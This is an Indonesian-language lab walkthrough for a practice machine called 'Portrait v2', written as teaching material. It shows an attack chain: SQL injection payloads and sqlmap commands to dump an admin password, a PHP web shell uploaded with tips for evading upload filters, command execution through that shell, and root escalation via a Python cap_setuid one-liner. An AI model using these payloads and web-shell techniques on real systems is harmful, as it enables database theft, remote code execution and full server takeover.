# 02 — Pembahasan Detail Lab Portrait v2
## SQL Injection → Credential Admin → Upload PHP → Python Capability → Root

> Target pembaca: peserta baru yang ingin memahami dari mana nama database/tabel didapat dan mengapa upload PHP bisa menjadi RCE.

---

## 1. Gambaran Besar

Alur lengkap Portrait:

```text
Recon web 8080
→ temukan /administrator, /profile, /uploads
→ uji login admin
→ SQL Injection pada parameter username
→ sqlmap cari current database
→ sqlmap cari tabel
→ sqlmap dump tabel users
→ dapat admin:AdminPortr417126
→ login admin
→ upload cakgup.php
→ akses /uploads/cakgup.php?cmd=id
→ RCE sebagai www-data
→ getcap menemukan python3.13 cap_setuid=ep
→ os.setuid(0)
→ root
→ find flag
```

---

## 2. Data Lab

| Item | Nilai |
|---|---|
| Target | `192.168.56.118` |
| Web | `http://192.168.56.118:8080` |
| Login | `/administrator` |
| Upload | `/profile` |
| Upload dir | `/uploads` |
| DB | `portrait` |
| Tabel | `users` |
| Credential | `admin:AdminPortr417126` |
| User awal | `www-data` |
| Privesc | `/usr/bin/python3.13 cap_setuid=ep` |
| Cari flag | `find / -type f -iname "*flag*" 2>/dev/null` |

---

## 3. Fase 1 — Recon Service dan Direktori

### Command

```bash
TARGET="192.168.56.118"
WEB="http://192.168.56.118:8080"

nmap -Pn -sC -sV -p8080 "$TARGET"
dirsearch -u "$WEB" -e php,html,txt
```

### Output yang Diharapkan

```text
8080/tcp open http
/administrator
/profile
/uploads
```

### Makna Output

```text
/administrator → tempat login dan uji SQL Injection
/profile       → tempat upload avatar/file
/uploads       → tempat file upload diakses
```

---

## 4. Fase 2 — Baseline Login

### Tujuan

Mengetahui bentuk request login sebelum menjalankan SQLMap.

### Command Uji Login Salah

```bash
curl -sS \
  -D login-failed.headers \
  -o login-failed.html \
  -c login.cookies \
  -X POST "$WEB/administrator/" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=InvalidPassword123!"
```

### Cek Response

```bash
cat login-failed.headers
grep -Ein 'invalid|incorrect|failed|error|username|password|dashboard|logout' login-failed.html
wc -c login-failed.html
```

### Output Contoh

```text
HTTP/1.1 200 OK
PHPSESSID=...
```

### Makna Output

Kita mengetahui:
- endpoint login menggunakan POST;
- parameter bernama `username` dan `password`;
- session cookie diset;
- request ini bisa dipakai sebagai dasar SQLMap.

---

## 5. Fase 3 — Uji SQL Injection Manual

### Payload

```text
' OR '1'='1
```

atau:

```text
admin'-- -
```

### Penjelasan

Jika query login rentan, payload membuat kondisi autentikasi menjadi benar atau mengomentari sisa query.

Namun untuk alur yang rapi, gunakan SQLMap agar database, tabel, dan credential diperoleh dengan evidence.

---

## 6. Fase 4 — SQLMap Tahap 1: Cari Current Database

### Set Endpoint

```bash
LOGIN_URL="$WEB/administrator"
POST_DATA='username=admin&password=test'
```

### Command

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  --current-db
```

### Output Evidence

```text
current database: 'portrait'
```

### Makna Output

Dari sini kita baru mengetahui nama database adalah `portrait`. Jadi tidak boleh langsung melompat ke `-D portrait` tanpa tahap ini jika sedang menjelaskan pembelajaran.

---

## 7. Fase 5 — SQLMap Tahap 2: Cari Tabel

### Command

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  -D portrait \
  --tables
```

### Output Evidence

```text
Database: portrait
[...]
users
```

### Makna Output

Tabel `users` adalah kandidat penyimpanan credential.

---

## 8. Fase 6 — SQLMap Tahap 3: Cari Kolom

### Command

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  -D portrait \
  -T users \
  --columns
```

### Output Contoh

```text
Database: portrait
Table: users
[...]
username
password
```

### Makna Output

Tahap ini menjelaskan kenapa kita tahu kolom mana yang akan didump. Pada ujian cepat bisa langsung `--dump`, tetapi pada lesson in depth tahap kolom penting untuk pemahaman.

---

## 9. Fase 7 — SQLMap Tahap 4: Dump Credential

### Command

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  -D portrait \
  -T users \
  --dump
```

### Output Evidence

```text
Username : admin
Password : AdminPortr417126
```

### Makna Output

Credential admin aplikasi sudah diperoleh secara valid dari database.

---

## 10. Fase 8 — Login Admin dan Upload Web Shell

### Login

```text
URL      : http://192.168.56.118:8080/administrator
Username : admin
Password : AdminPortr417126
```

### Buka Upload

```text
http://192.168.56.118:8080/profile
```

### Buat Web Shell

```bash
cat > cakgup.php <<'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

### Penjelasan

File ini akan menjalankan isi parameter `cmd`.

Contoh:

```text
/uploads/cakgup.php?cmd=id
```

akan menjalankan `id`.

### Upload

Upload `cakgup.php` melalui fitur avatar/profile.

Jika aplikasi melakukan filter:
- coba Content-Type `image/jpeg`;
- coba ekstensi alternatif jika memang diperlukan;
- tetap pastikan file diproses sebagai PHP.

---

## 11. Fase 9 — Validasi RCE

### Command

```bash
SHELL_URL="$WEB/uploads/cakgup.php"

curl -sG \
  --data-urlencode "cmd=id; whoami; hostname" \
  "$SHELL_URL"
```

### Output Evidence

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
```

### Makna Output

Upload sudah berubah menjadi RCE. User awal adalah `www-data`.

---

## 12. Fase 10 — Enumerasi Capability

### Command

```bash
curl -sG \
  --data-urlencode "cmd=getcap -r / 2>/dev/null" \
  "$SHELL_URL"
```

### Output Evidence

```text
/usr/bin/python3.13 cap_setuid=ep
```

### Makna Output

Binary Python memiliki capability untuk mengubah UID proses. Ini adalah jalur privilege escalation.

---

## 13. Fase 11 — Root Proof

### Command

```bash
curl -sG \
  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"id; whoami\")'" \
  "$SHELL_URL"
```

### Output yang Diharapkan

```text
uid=0(root)
root
```

### Penjelasan

`os.setuid(0)` mengubah UID proses menjadi root. Lalu `os.system()` menjalankan command sebagai root.

---

## 14. Fase 12 — Cari dan Baca Flag

### Cari Flag

```bash
curl -sG \
  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"find / -type f -iname \\\"*flag*\\\" 2>/dev/null\")'" \
  "$SHELL_URL"
```

### Output Contoh

```text
/root/flag.txt
```

### Baca Flag

Ganti `/PATH/FLAG` dengan hasil `find`.

```bash
curl -sG \
  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"cat /PATH/FLAG\")'" \
  "$SHELL_URL"
```

---

## 15. Troubleshooting Portrait

| Masalah | Penyebab | Solusi |
|---|---|---|
| SQLMap tidak jalan | URL/POST_DATA salah | Pastikan endpoint dan parameter benar |
| Tidak tahu DB | Tahap `--current-db` belum dijalankan | Jalankan fase 4 |
| Tidak tahu tabel | Tahap `--tables` belum dijalankan | Jalankan fase 5 |
| Web shell 404 | Nama/lokasi upload salah | Cek `/uploads` dan nama file |
| PHP tidak dieksekusi | Upload dir tidak proses PHP | Cek lokasi lain atau perilaku upload |
| Python path berbeda | Versi berbeda | `getcap -r / | grep python` |

---

## 16. Alur Hafalan Portrait

```text
nmap 8080
dirsearch → /administrator /profile /uploads
curl login baseline
sqlmap --current-db → portrait
sqlmap --tables → users
sqlmap --columns
sqlmap --dump → admin password
login admin
upload cakgup.php
curl cmd=id → www-data
getcap → python cap_setuid
os.setuid(0)
find flag
cat flag
```
